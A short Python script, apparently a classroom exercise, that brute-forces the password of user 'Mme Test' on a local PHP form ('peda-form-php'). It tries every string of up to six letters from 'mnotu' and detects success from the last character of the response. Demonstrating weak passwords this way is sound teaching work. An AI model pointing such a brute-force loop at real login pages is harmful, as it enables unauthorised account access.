from urllib import parse
from urllib import request

# https://docs.python.org/3.2/library/urllib.request.html?highlight=urllib#examples
def tentative(mdp):
    data_dict = {'Connexion': 0,
                 'nom': 'Mme Test',
                 'mdp': mdp}
    post_data = parse.urlencode(data_dict)
    post_data = post_data.encode('utf-8')
    req = request.Request("http://localhost/peda-form-php/?etape=5")
    req.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
    content = request.urlopen(req, post_data)
    content_str = content.read().decode("utf-8").strip()
    dernier_caractere = content_str[-1:]
    return dernier_caractere == "?"

def liste_mdp(nb_caracteres, alphabet):
    if nb_caracteres == 0:
        return [""]
    else:
        liste_retour = []
        liste_precedente = liste_mdp(nb_caracteres - 1, alphabet)
        for mdp in liste_precedente:
            for lettre in alphabet:
                liste_retour.append(mdp + lettre)
        return liste_precedente + liste_retour

for mdp in liste_mdp(6, "mnotu"):
    if tentative(mdp):
        print(mdp)
        break
